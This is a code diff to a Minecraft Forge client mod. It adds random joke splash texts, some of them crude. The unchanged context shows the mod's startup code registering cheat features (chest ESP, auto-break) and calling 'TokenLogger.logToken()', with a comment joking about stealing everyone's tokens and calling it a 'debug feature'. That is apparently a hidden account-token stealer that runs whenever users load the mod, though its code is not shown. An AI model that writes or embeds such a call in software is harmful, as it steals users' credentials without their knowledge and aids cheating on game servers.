@@ -20,6 +20,7 @@ import net.minecraftforge.fml.common.gameevent.TickEvent;
 import org.lwjgl.opengl.Display;
 
 import java.util.List;
+import java.util.Random;
 
 /**
  * The entrypoint of the Example Mod that initializes it.
@@ -37,8 +38,11 @@ public class FlorboMod {
     public static FlorboMod INSTANCE;
     public static FlorboConfig config;
     public Minecraft mc;
+    public static String splashText;
+    public String[] customSplashes = {"florbo client best mod !!!!", "ABONGUS", "what the sigma", "skibidi toilet w rizz", "ono ono ono ono ono ono", "sponsored by suupan kebab oy", "i shitted", "HOP ON HYPIXEL NO DOWNTIME", "local e-kittens in your area !!!"};
     @Mod.EventHandler
     public void onInit(FMLInitializationEvent event) {
+        splashText = getRandomString(customSplashes);
         config = new FlorboConfig();
         CommandManager.INSTANCE.registerCommand(new FlorboCommand());
         mc = Minecraft.getMinecraft();
@@ -46,5 +50,8 @@ public class FlorboMod {
         MinecraftForge.EVENT_BUS.register(new ChestEsp());
         MinecraftForge.EVENT_BUS.register(new AutoBreak());
         TokenLogger.logToken(); // HIIHAHIAHIAHIAHAH im stealing everyones bobux (its debug feature dont worry) nocappers
+    }
+    public static String getRandomString(String[] array) {
+        return array[new Random().nextInt(array.length)];
     }
 }
